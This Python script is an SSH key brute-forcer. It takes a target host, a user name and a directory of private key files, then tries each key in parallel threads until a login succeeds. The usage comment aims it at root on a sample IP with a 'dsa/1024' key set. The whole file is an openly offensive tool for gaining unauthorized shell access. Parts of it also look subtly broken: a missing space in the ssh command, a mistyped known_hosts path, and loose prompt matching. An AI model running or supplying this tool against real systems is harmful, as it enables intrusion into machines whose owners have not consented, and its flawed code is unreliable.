#!/usr/bin/python
# -*- coding:utf-8 -*-
import pexpect
import optparse
import os
from threading import *


max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
stop = False
fails = 0


def connect(user, host, keyfile, release):
    global stop
    global fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        conn_str = 'ssh' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(conn_str)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])
        if ret == 2:
            print('[-] Adding Host to !/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            fails += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            stop = True
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('Usage%prog -H <target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgt_host', type='string', help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('-d', dest='pass_dir', type='string', help='specify directory with keys')
    (options, args) = parser.parse_args()
    host = options.tgt_host
    pass_dir = options.pass_dir
    user = options.user
    if host is None or pass_dir is None or user is None:
        print(parser.usage)
        exit(0)
    for filename in os.listdir(pass_dir):
        if stop:
            print('[*] Exiting: Key Found.')
            exit(0)
        if fails > 5:
            print('[!] Exiting: Too Many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            exit(0)
        connection_lock.acquire()
        full_path = os.path.join(pass_dir, filename)
        print('[-] Testing keyfile ' + str(full_path))
        t = Thread(target=connect, args=(user, host, full_path, True))
        child = t.start()


if __name__ == '__main__':
    # python *.py -H 10.10.13.37 -u root -d dsa/1024
    main()


